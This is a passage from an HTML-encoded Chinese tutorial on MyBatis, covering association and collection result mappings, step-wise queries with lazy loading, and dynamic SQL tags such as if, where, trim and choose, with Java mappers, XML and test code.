    // &#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4EE5;&#x53CA;&#x5458;&#x5DE5;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x90E8;&#x95E8;&#x4FE1;&#x606F;
    Emp getEmpAndDept(@Param(&quot;eid&quot;) Integer eid);
}
</code></pre>
<pre><code class="language-xml">&lt;resultMap id=&quot;getEmpAndDeptResultMapOne&quot; type=&quot;Emp&quot;&gt;
    &lt;id property=&quot;eid&quot; column=&quot;eid&quot;&gt;&lt;/id&gt;
    &lt;result property=&quot;empName&quot; column=&quot;emp_name&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;age&quot; column=&quot;age&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;sex&quot; column=&quot;sex&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;email&quot; column=&quot;email&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;dept.did&quot; column=&quot;did&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;dept.deptName&quot; column=&quot;dept_name&quot;&gt;&lt;/result&gt;
&lt;/resultMap&gt;
&lt;select id=&quot;getEmpAndDept&quot; resultMap=&quot;getEmpAndDeptResultMapOne&quot;&gt;
    select * from t_emp left join t_dept on t_emp.did = t_dept.did where t_emp.eid = #{eid}
&lt;/select&gt;
</code></pre>
<ul>
<li>association &#x6807;&#x7B7E;</li>
</ul>
<pre><code class="language-java">public interface EmpMapper {
    // &#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4EE5;&#x53CA;&#x5458;&#x5DE5;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x90E8;&#x95E8;&#x4FE1;&#x606F;
    Emp getEmpAndDept(@Param(&quot;eid&quot;) Integer eid);
}
</code></pre>
<pre><code class="language-xml">&lt;resultMap id=&quot;getEmpAndDeptResultMapOne&quot; type=&quot;Emp&quot;&gt;
    &lt;id property=&quot;eid&quot; column=&quot;eid&quot;&gt;&lt;/id&gt;
    &lt;result property=&quot;empName&quot; column=&quot;emp_name&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;age&quot; column=&quot;age&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;sex&quot; column=&quot;sex&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;email&quot; column=&quot;email&quot;&gt;&lt;/result&gt;
    &lt;!-- association&#x4E13;&#x95E8;&#x5904;&#x7406;&#x591A;&#x5BF9;&#x4E00;&#x5173;&#x7CFB; =&gt; property&#x8868;&#x793A;&#x9700;&#x8981;&#x5904;&#x7406;&#x591A;&#x5BF9;&#x4E00;&#x5173;&#x7CFB;&#x7684;&#x5C5E;&#x6027;&#x540D;;javaType&#x8868;&#x793A;&#x8BE5;&#x5C5E;&#x6027;&#x7684;&#x7C7B;&#x578B; --&gt;
    &lt;association property=&quot;dept&quot; javaType=&quot;Dept&quot;&gt;
        &lt;id property=&quot;did&quot; column=&quot;did&quot;&gt;&lt;/id&gt;
        &lt;result property=&quot;deptName&quot; column=&quot;dept_name&quot;&gt;&lt;/result&gt;
    &lt;/association&gt;
&lt;/resultMap&gt;
&lt;select id=&quot;getEmpAndDept&quot; resultMap=&quot;getEmpAndDeptResultMapOne&quot;&gt;
    select * from t_emp left join t_dept on t_emp.did = t_dept.did where t_emp.eid = #{eid}
&lt;/select&gt;
</code></pre>
<pre><code class="language-java">public class ResultMapTest {
    @Test
    public void testGetEmpAndDept(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);
        Emp empAndDept = mapper.getEmpAndDept(1);
        System.out.println(empAndDept);
    }
}
</code></pre>
<ul>
<li>&#x5206;&#x6B65;&#x67E5;&#x8BE2;</li>
</ul>
<pre><code class="language-java">public interface EmpMapper {
    // &amp;&#x5206;&#x6B65;&#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4EE5;&#x53CA;&#x5458;&#x5DE5;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x90E8;&#x95E8; =&gt; 1.&#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4FE1;&#x606F;
    Emp getEmpAndDeptByStepOne(@Param(&quot;eid&quot;) Integer eid);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.EmpMapper&quot;&gt;
...
    &lt;!-- select &#x8BBE;&#x7F6E;&#x5206;&#x5E03;&#x67E5;&#x8BE2;sql&#x7684;&#x552F;&#x4E00;&#x6807;&#x8BC6; =&gt; namespace.sqlId or mapper&#x63A5;&#x53E3;&#x7684;&#x5168;&#x7C7B;&#x540D;.&#x65B9;&#x6CD5;&#x540D; --&gt;
    &lt;!-- column &#x8BBE;&#x7F6E;&#x5206;&#x5E03;&#x67E5;&#x8BE2;&#x7684;&#x6761;&#x4EF6; --&gt;
    &lt;!-- &#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;&#x9ED8;&#x8BA4;&#x5728; mybatis &#x4E0D;&#x5F00;&#x542F; --&gt;
    &lt;!-- fetchType &#x5168;&#x5C40;&#x5F00;&#x542F;&#x4E86;&#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;&#x540E;&#x53EF;&#x624B;&#x63A7;&#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;&#x7684;&#x6548;&#x679C; =&gt; lazy|eager --&gt;
    &lt;resultMap id=&quot;empAndDeptByStepOne&quot; type=&quot;Emp&quot;&gt;
        &lt;id property=&quot;eid&quot; column=&quot;eid&quot;&gt;&lt;/id&gt;
        &lt;result property=&quot;empName&quot; column=&quot;emp_name&quot;&gt;&lt;/result&gt;
        &lt;result property=&quot;age&quot; column=&quot;age&quot;&gt;&lt;/result&gt;
        &lt;result property=&quot;sex&quot; column=&quot;sex&quot;&gt;&lt;/result&gt;
        &lt;result property=&quot;email&quot; column=&quot;email&quot;&gt;&lt;/result&gt;
        &lt;association property=&quot;dept&quot; select=&quot;com.zszy.mybatis.mapper.DeptMapper.getEmpAndDeptByStepTwo&quot; column=&quot;did&quot; fetchType=&quot;lazy&quot;&gt;&lt;/association&gt;
    &lt;/resultMap&gt;
    &lt;!-- Emp getEmpAndDeptByStepOne(@Param(&quot;eid&quot;) Integer eid); --&gt;
    &lt;select id=&quot;getEmpAndDeptByStepOne&quot; resultMap=&quot;empAndDeptByStepOne&quot;&gt;
        select * from t_emp where eid = #{eid}
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public interface DeptMapper {
    // &amp;&amp;&#x5206;&#x6B65;&#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4EE5;&#x53CA;&#x5458;&#x5DE5;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x90E8;&#x95E8; =&gt; 2.&#x901A;&#x8FC7;did&#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x5BF9;&#x5E94;&#x7684;&#x90E8;&#x95E8;&#x4FE1;&#x606F;
    Dept getEmpAndDeptByStepTwo(@Param(&quot;did&quot;) Integer did);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.DeptMapper&quot;&gt;
...
    &lt;resultMap id=&quot;empAndDeptByStepTwo&quot; type=&quot;Dept&quot;&gt;
    &lt;id property=&quot;did&quot; column=&quot;did&quot;&gt;&lt;/id&gt;
        &lt;result property=&quot;deptName&quot; column=&quot;dept_name&quot;&gt;&lt;/result&gt;
    &lt;/resultMap&gt;
    &lt;!-- Dept getEmpAndDeptByStepTwo(@Param(&quot;did&quot;) Integer did); --&gt;
    &lt;select id=&quot;getEmpAndDeptByStepTwo&quot; resultMap=&quot;empAndDeptByStepTwo&quot;&gt;
        select * from t_dept where did = #{did}
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class ResultMapTest {
    @Test
    public void testGetEmpAndDeptByStep(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);
        Emp empAndDeptByStepOne = mapper.getEmpAndDeptByStepOne(1);
        System.out.println(empAndDeptByStepOne);
    }
}
</code></pre>
<h3 id="%E4%B8%80%E5%AF%B9%E5%A4%9A%E6%98%A0%E5%B0%84%E5%A4%84%E7%90%86">&#x4E00;&#x5BF9;&#x591A;&#x6620;&#x5C04;&#x5904;&#x7406;</h3>
<pre><code class="language-java">public class Dept {
    private Integer did;
    private String deptName;
    // &#x901A;&#x8FC7;&#x96C6;&#x5408;&#x8868;&#x793A;&#x4E00;&#x5BF9;&#x591A;&#x7684;&#x5173;&#x7CFB;
    private List&lt;Emp&gt; emps;
    ...
}
</code></pre>
<pre><code class="language-java">public interface DeptMapper {
    // &#x67E5;&#x8BE2;&#x90E8;&#x95E8;&#x4EE5;&#x53CA;&#x90E8;&#x95E8;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x5458;&#x5DE5;&#x4FE1;&#x606F;
    Dept getDeptAndEmp(@Param(&quot;did&quot;) Integer did);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.DeptMapper&quot;&gt;
    &lt;!-- &#x5904;&#x7406;&#x4E00;&#x5BF9;&#x591A;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB; --&gt;
    &lt;!-- 1.collection --&gt;
    &lt;resultMap id=&quot;deptAndEmpResultMap&quot; type=&quot;Dept&quot;&gt;
        &lt;id property=&quot;did&quot; column=&quot;did&quot;&gt;&lt;/id&gt;
        &lt;result property=&quot;deptName&quot; column=&quot;dept_name&quot;&gt;&lt;/result&gt;
        &lt;!-- collection &#x5904;&#x7406;&#x4E00;&#x5BF9;&#x591A;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB; --&gt;
        &lt;!-- ofType &#x8868;&#x793A;&#x8BE5;&#x5C5E;&#x6027;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x96C6;&#x5408;&#x4E2D;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x7C7B;&#x578B; --&gt;
        &lt;collection property=&quot;emps&quot; ofType=&quot;Emp&quot;&gt;
            &lt;id property=&quot;eid&quot; column=&quot;edi&quot;&gt;&lt;/id&gt;
            &lt;result property=&quot;empName&quot; column=&quot;emp_name&quot;&gt;&lt;/result&gt;
            &lt;result property=&quot;age&quot; column=&quot;age&quot;&gt;&lt;/result&gt;
            &lt;result property=&quot;sex&quot; column=&quot;sex&quot;&gt;&lt;/result&gt;
            &lt;result property=&quot;email&quot; column=&quot;email&quot;&gt;&lt;/result&gt;
        &lt;/collection&gt;
    &lt;/resultMap&gt;
    &lt;!-- Dept getDeptAndEmp(@Param(&quot;did&quot;) Integer did); --&gt;
    &lt;select id=&quot;getDeptAndEmp&quot; resultMap=&quot;deptAndEmpResultMap&quot;&gt;
        select * from t_dept left join t_emp on t_dept.did = t_emp.did where t_dept.did = #{did}
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class ResultMapTest {
    @Test
    public void testGetDeptAndEmp(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        DeptMapper mapper = sqlSession.getMapper(DeptMapper.class);
        Dept deptAndEmp = mapper.getDeptAndEmp(1);
        System.out.println(deptAndEmp);
    }
}
</code></pre>
<ul>
<li>&#x5206;&#x6B65;&#x67E5;&#x8BE2;</li>
</ul>
<pre><code class="language-java">public interface DeptMapper {
    // &amp;&#x5206;&#x6B65;&#x67E5;&#x8BE2;&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x90E8;&#x95E8;&#x4EE5;&#x53CA;&#x5458;&#x5DE5;&#x4FE1;&#x606F; =&gt; 1.&#x67E5;&#x8BE2;&#x90E8;&#x95E8;&#x4FE1;&#x606F;
    Dept getDeptAndEmpByStepOne(@Param(&quot;did&quot;) Integer did);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.DeptMapper&quot;&gt;
    &lt;!-- 2.&#x5206;&#x6B65;&#x67E5;&#x8BE2; --&gt;
    &lt;resultMap id=&quot;deptAndEmpByStepResultMap&quot; type=&quot;Dept&quot;&gt;
        &lt;id property=&quot;did&quot; column=&quot;did&quot;&gt;&lt;/id&gt;
        &lt;result property=&quot;deptName&quot; column=&quot;dept_name&quot;&gt;&lt;/result&gt;
        &lt;collection property=&quot;emps&quot; select=&quot;com.zszy.mybatis.mapper.EmpMapper.getDeptAndEmpByStepTwo&quot; column=&quot;did&quot;&gt;&lt;/collection&gt;
    &lt;/resultMap&gt;
    &lt;!-- Dept getDeptAndEmpByStepOne(@Param(&quot;did&quot;) Integer did); --&gt;
    &lt;select id=&quot;getDeptAndEmpByStepOne&quot; resultMap=&quot;deptAndEmpByStepResultMap&quot;&gt;
        select * from t_dept where did = #{did}
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public interface EmpMapper {
    // &amp;&amp;&#x5206;&#x6B65;&#x67E5;&#x8BE2;&#x90E8;&#x95E8;&#x4EE5;&#x53CA;&#x90E8;&#x95E8;&#x5458;&#x5DE5; =&gt; 2.&#x6839;&#x636E;did&#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4FE1;&#x606F;
    List&lt;Emp&gt; getDeptAndEmpByStepTwo(@Param(&quot;did&quot;) Integer did);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.EmpMapper&quot;&gt;
    ...
    &lt;!-- List&lt;Emp&gt; getDeptAndEmpByStepTwo(@Param(&quot;did&quot;) Integer did); --&gt;
    &lt;select id=&quot;getDeptAndEmpByStepTwo&quot; resultType=&quot;Emp&quot;&gt;
        select * from t_emp where did = #{did}
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class ResultMapTest {
    @Test
    public void testGetDeptAndEmpByStep(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        DeptMapper mapper = sqlSession.getMapper(DeptMapper.class);
        Dept deptAndEmpByStepOne = mapper.getDeptAndEmpByStepOne(1);
        System.out.println(deptAndEmpByStepOne);
    }
}
</code></pre>
<h3 id="%E5%BB%B6%E8%BF%9F%E5%8A%A0%E8%BD%BD">&#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;</h3>
<p>&#x5206;&#x6B65;&#x67E5;&#x8BE2;&#x7684;&#x4F18;&#x52BF;&#x5728;&#x4E8E;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;&#xFF0C;&#x4F46;&#x662F;&#x5FC5;&#x987B;&#x5728;&#x6838;&#x5FC3;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x8BBE;&#x7F6E;&#x5168;&#x5C40;&#x914D;&#x7F6E;&#x4FE1;&#x606F;&#x3002;&#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;&#x53C8;&#x53EB;&#x61D2;&#x52A0;&#x8F7D;&#xFF0C;&#x4E5F;&#x53EB;&#x6309;&#x9700;&#x52A0;&#x8F7D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5148;&#x52A0;&#x8F7D;&#x4E3B;&#x8868;&#x4FE1;&#x606F;&#xFF0C;&#x9700;&#x8981;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x518D;&#x53BB;&#x52A0;&#x8F7D;&#x4ECE;&#x8868;&#x4FE1;&#x606F;&#x3002;&#x4EE3;&#x7801;&#x6267;&#x884C;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x65F6;&#xFF0C;&#x5E76;&#x975E;&#x5373;&#x65F6;&#x53BB;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x67E5;&#x8BE2;&#xFF0C;&#x800C;&#x662F;&#x6839;&#x636E;&#x8BBE;&#x7F6E;&#x7684;&#x5EF6;&#x8FDF;&#x7B56;&#x7565;&#x63A8;&#x8FDF;&#x67E5;&#x8BE2;&#x3002;</p>
<blockquote>
<p>lazyLoadingEnabled =&gt; &#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;&#x3002;&#x5F00;&#x542F;&#x65F6;&#x6240;&#x6709;&#x5173;&#x8054;&#x5BF9;&#x8C61;&#x90FD;&#x4F1A;&#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;&#x3002;<br>
aggressiveLazyLoading =&gt; &#x6309;&#x9700;&#x52A0;&#x8F7D;&#x3002;&#x5F00;&#x542F;&#x65F6;&#x4EFB;&#x4F55;&#x65B9;&#x6CD5;&#x7684;&#x8C03;&#x7528;&#x90FD;&#x4F1A;&#x52A0;&#x8F7D;&#x8BE5;&#x5BF9;&#x8C61;&#x7684;&#x6240;&#x6709;&#x5C5E;&#x6027;&#x3002;&#x5426;&#x5219;&#x6BCF;&#x4E2A;&#x5C5E;&#x6027;&#x90FD;&#x4F1A;&#x6309;&#x9700;&#x52A0;&#x8F7D;&#x3002;</p>
</blockquote>
<p>&#x6B64;&#x5916;&#x53EF;&#x901A;&#x8FC7; association &#x548C; collection &#x4E2D;&#x7684; fetchType &#x5C5E;&#x6027;&#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x7684;&#x5206;&#x6B65;&#x67E5;&#x8BE2;&#x662F;&#x5426;&#x4F7F;&#x7528;&#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;&#xFF0C;fetchType=&quot;lazy &#x5EF6;&#x8FDF;&#x52A0;&#x8F7D;|eager &#x7ACB;&#x5373;&#x52A0;&#x8F7D;&quot;&#x3002;</p>
<pre><code class="language-xml">&lt;!-- mybatis-config.xml --&gt;
&lt;configuration&gt;
    &lt;properties resource=&quot;jdbc.properties&quot;/&gt;
    &lt;!-- &#x8BBE;&#x7F6E;mybatis&#x5168;&#x5C40;&#x914D;&#x7F6E; --&gt;
    &lt;settings&gt;
        &lt;!-- &#x5C06;&#x4E0B;&#x5212;&#x7EBF;&#x81EA;&#x52A8;&#x6620;&#x5C04;&#x4E3A;&#x9A7C;&#x5CF0; --&gt;
        &lt;setting name=&quot;mapUnderscoreToCamelCase&quot; value=&quot;true&quot;/&gt;
        &lt;!-- &#x5F00;&#x542F;&#x5EF6;&#x8FDF;&#x52A0;&#x8F7D; --&gt;
        &lt;setting name=&quot;lazyLoadingEnabled&quot; value=&quot;true&quot;/&gt;
    &lt;/settings&gt;
    &lt;typeAliases&gt;
        &lt;package name=&quot;com.zszy.mybatis.pojo&quot;/&gt;
    &lt;/typeAliases&gt;
    &lt;environments default=&quot;development&quot;&gt;
        &lt;environment id=&quot;development&quot;&gt;
            &lt;transactionManager type=&quot;JDBC&quot;/&gt;
            &lt;dataSource type=&quot;POOLED&quot;&gt;
                &lt;property name=&quot;driver&quot; value=&quot;${jdbc.driver}&quot;/&gt;
                &lt;property name=&quot;url&quot; value=&quot;${jdbc.url}&quot;/&gt;
                &lt;property name=&quot;username&quot; value=&quot;${jdbc.username}&quot;/&gt;
                &lt;property name=&quot;password&quot; value=&quot;${jdbc.password}&quot;/&gt;
            &lt;/dataSource&gt;
        &lt;/environment&gt;
    &lt;/environments&gt;
    &lt;mappers&gt;
        &lt;package name=&quot;com.zszy.mybatis.mapper&quot;/&gt;
    &lt;/mappers&gt;
&lt;/configuration&gt;
</code></pre>
<pre><code class="language-java">public class ResultMapTest {
    ...
    @Test
    public void testGetEmpAndDeptByStepLazyLoadingEnabled(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);
        Emp empAndDeptByStepOne = mapper.getEmpAndDeptByStepOne(1);
        System.out.println(empAndDeptByStepOne.getEmpName()); // &#x53EA;&#x4F1A;&#x6267;&#x884C;&#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4FE1;&#x606F;&#x7684; sql
        System.out.println(&quot;---------&quot;);
        System.out.println(empAndDeptByStepOne.getDept()); // &#x6267;&#x884C;&#x67E5;&#x8BE2;&#x5458;&#x5DE5;&#x4EE5;&#x53CA;&#x90E8;&#x95E8;&#x4FE1;&#x606F;&#x7684; sql
    }
}
</code></pre>
<h3 id="%E5%8A%A8%E6%80%81-sql">&#x52A8;&#x6001; SQL</h3>
<p>&#x52A8;&#x6001; sql &#x80FD;&#x6839;&#x636E;&#x7279;&#x5B9A;&#x6761;&#x4EF6;&#x52A8;&#x6001;&#x62FC;&#x88C5; sql &#x8BED;&#x53E5;&#xFF0C;&#x5E38;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x5B57;&#x7B26;&#x4E32;&#x62FC;&#x63A5;&#x3002;</p>
<ul>
<li>if &#x6807;&#x7B7E;</li>
</ul>
<p>if &#x6807;&#x7B7E;&#x901A;&#x8FC7; test &#x5C5E;&#x6027;&#x4F20;&#x9012;&#x8FC7;&#x6765;&#x7684;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x8868;&#x8FBE;&#x5F0F;&#x5224;&#x65AD;&#xFF0C;&#x82E5;&#x7ED3;&#x679C;&#x4E3A;&#x771F;&#xFF0C;&#x5219;&#x6807;&#x7B7E;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x4F1A;&#x6267;&#x884C;&#xFF1B;&#x53CD;&#x4E4B;&#x6807;&#x7B7E;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x4F1A;&#x6267;&#x884C;&#x3002;</p>
<p>&#x4E3A;&#x907F;&#x514D;<code>where</code> &#x4F1A;&#x4E0E; <code>and</code> &#x8FDE;&#x7528;&#x7684;&#x62A5;&#x9519;&#xFF0C;&#x53EF;&#x4EE5;&#x5728; <code>where</code> &#x540E;&#x9762;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x6052;&#x6210;&#x7ACB;&#x6761;&#x4EF6;<code>1=1</code> &#x6765;&#x62FC;&#x63A5; <code>and</code> &#x8BED;&#x53E5;&#xFF0C;&#x8FD9;&#x79CD;&#x65B9;&#x5F0F;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x3002;</p>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.DynamicSQLMapper&quot;&gt;
    &lt;select id=&quot;getEmpByCondition&quot; resultType=&quot;Emp&quot;&gt;
        select * from t_emp where 1=1
        &lt;if test=&quot;empName != null and empName != &apos;&apos;&quot;&gt;and emp_name=#{empName}&lt;/if&gt;
        &lt;if test=&quot;age !=null and age != &apos;&apos;&quot;&gt;and age = #{age}&lt;/if&gt;
        &lt;if test=&quot;sex !=null and sex != &apos;&apos;&quot;&gt;and sex = #{sex}&lt;/if&gt;
        &lt;if test=&quot;email !=null and email != &apos;&apos;&quot;&gt;and email = #{email}&lt;/if&gt;
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<ul>
<li>where &#x6807;&#x7B7E;</li>
</ul>
<p>where &#x548C; if &#x4E00;&#x822C;&#x7ED3;&#x5408;&#x4F7F;&#x7528;&#x3002;&#x82E5; where &#x6807;&#x7B7E;&#x4E2D;&#x7684; if &#x6761;&#x4EF6;&#x90FD;&#x4E0D;&#x6EE1;&#x8DB3;&#xFF0C;&#x5219; where &#x6807;&#x7B7E;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x529F;&#x80FD;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x6DFB;&#x52A0; where &#x5173;&#x952E;&#x5B57;&#x3002;&#x5F53; if &#x6761;&#x4EF6;&#x6EE1;&#x8DB3;&#xFF0C;&#x624D;&#x4F1A;&#x81EA;&#x52A8;&#x6DFB;&#x52A0; where &#x5173;&#x952E;&#x5B57;&#xFF0C;&#x5E76;&#x5C06;&#x6761;&#x4EF6;<strong>&#x6700;&#x524D;&#x65B9;</strong>&#x591A;&#x4F59;&#x7684; and/or &#x53BB;&#x6389;&#x3002;</p>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.DynamicSQLMapper&quot;&gt;
    &lt;select id=&quot;getEmpByCondition&quot; resultType=&quot;Emp&quot;&gt;
    select * from t_emp
    &lt;where&gt;
        &lt;!-- emp_name = #{empName} and &#x4E0D;&#x8981;&#x8FD9;&#x4E48;&#x5199; =&gt; &#x53BB;&#x4E0D;&#x6389; and --&gt;
        &lt;if test=&quot;empName != null and empName != &apos;&apos;&quot;&gt;emp_name=#{empName}&lt;/if&gt;
        &lt;if test=&quot;age !=null and age != &apos;&apos;&quot;&gt;and age = #{age}&lt;/if&gt;
        &lt;if test=&quot;sex !=null and sex != &apos;&apos;&quot;&gt;and sex = #{sex}&lt;/if&gt;
        &lt;if test=&quot;email !=null and email != &apos;&apos;&quot;&gt;and email = #{email}&lt;/if&gt;
    &lt;/where&gt;
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<ul>
<li>trim &#x6807;&#x7B7E;</li>
</ul>
<p>prefix =&gt; &#x5728; trim &#x6807;&#x7B7E;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x524D;&#x9762;&#x6DFB;&#x52A0;&#x67D0;&#x4E9B;&#x5185;&#x5BB9;&#x3002;suffix =&gt; &#x5728; trim &#x6807;&#x7B7E;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x540E;&#x9762;&#x6DFB;&#x52A0;&#x67D0;&#x4E9B;&#x5185;&#x5BB9;&#x3002;prefixOverrides =&gt; &#x5728; trim &#x6807;&#x7B7E;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x524D;&#x9762;&#x53BB;&#x6389;&#x67D0;&#x4E9B;&#x5185;&#x5BB9;&#x3002;suffixOverrides =&gt; &#x5728; trim &#x6807;&#x7B7E;&#x4E2D;&#x7684;&#x5185;&#x5BB9;&#x540E;&#x9762;&#x53BB;&#x6389;&#x67D0;&#x4E9B;&#x5185;&#x5BB9;&#x3002;&#x82E5; trim &#x4E2D;&#x7684;&#x6807;&#x7B7E;&#x90FD;&#x4E0D;&#x6EE1;&#x8DB3;&#x6761;&#x4EF6; =&gt; trim &#x6807;&#x7B7E;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6548;&#x679C;&#x3002;</p>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.DynamicSQLMapper&quot;&gt;
    &lt;select id=&quot;getEmpByCondition&quot; resultType=&quot;Emp&quot;&gt;
        select * from t_emp
        &lt;trim prefix=&quot;where&quot; suffixOverrides=&quot;and|or&quot;&gt;
            &lt;if test=&quot;empName != null and empName != &apos;&apos;&quot;&gt;emp_name=#{empName} and&lt;/if&gt;
            &lt;if test=&quot;age !=null and age != &apos;&apos;&quot;&gt;age = #{age} and&lt;/if&gt;
            &lt;if test=&quot;sex !=null and sex != &apos;&apos;&quot;&gt;sex = #{sex} and&lt;/if&gt;
            &lt;if test=&quot;email !=null and email != &apos;&apos;&quot;&gt;email = #{email} and&lt;/if&gt;
        &lt;/trim&gt;
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<ul>
<li>choose(when&#x3001;otherwise) &#x6807;&#x7B7E;&#x4E0E; SQL &#x7247;&#x6BB5;</li>
</ul>
<p>choose(when&#x3001;otherwise) &#x76F8;&#x5F53;&#x4E8E; if...else&#xFF0C;when &#x81F3;&#x5C11;&#x8981;&#x6709;&#x4E00;&#x4E2A;&#xFF0C;otherwise &#x81F3;&#x591A;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x3002;&#x5728;&#x786E;&#x5B9A;&#x4E00;&#x4E2A; when &#x6210;&#x7ACB;&#x540E;&#xFF0C;&#x4E0D;&#x518D;&#x6267;&#x884C;&#x540E;&#x7EED;&#x64CD;&#x4F5C;&#x3002;</p>
<p>sql &#x7247;&#x6BB5;&#x53EF;&#x4EE5;&#x8BB0;&#x5F55;&#x4E00;&#x6BB5;&#x516C;&#x5171; sql &#x7247;&#x6BB5;&#xFF0C;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x5730;&#x65B9;&#x901A;&#x8FC7; include &#x6807;&#x7B7E;&#x8FDB;&#x884C;&#x5F15;&#x5165;&#x3002;</p>
<pre><code class="language-java">public interface DynamicSQLMapper {
    // &#x6D4B;&#x8BD5; choose&#x3001;when&#x3001;otherwise
    List&lt;Emp&gt; getEmpByChoose(Emp emp);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.DynamicSQLMapper&quot;&gt;
    &lt;sql id=&quot;empColumns&quot;&gt;eid,emp_name,age,sex,email&lt;/sql&gt;
    &lt;select id=&quot;getEmpByChoose&quot; resultType=&quot;Emp&quot;&gt;
        select &lt;include refid=&quot;empColumns&quot;&gt;&lt;/include&gt; from t_emp
        &lt;where&gt;
            &lt;choose&gt;
                &lt;when test=&quot;empName != null and empName != &apos;&apos;&quot;&gt;emp_name=#{empName}&lt;/when&gt;
                &lt;when test=&quot;age != null and age != &apos;&apos;&quot;&gt;age=#{age}&lt;/when&gt;
                &lt;when test=&quot;sex != null and sex != &apos;&apos;&quot;&gt;sex=#{sex}&lt;/when&gt;
                &lt;when test=&quot;email != null and email != &apos;&apos;&quot;&gt;email=#{email}&lt;/when&gt;
                &lt;otherwise&gt; did = 1 &lt;/otherwise&gt;
            &lt;/choose&gt;
        &lt;/where&gt;
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class DynamicSQLMapperTest {
    @Test
    public void testGetEmpByChoose(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        DynamicSQLMapper mapper = sqlSession.getMapper(DynamicSQLMapper.class);
        List&lt;Emp&gt; list = mapper.getEmpByChoose(new Emp(null, null, null, null, null));
        System.out.println(list);
    }
}
</code></pre>
<ul>
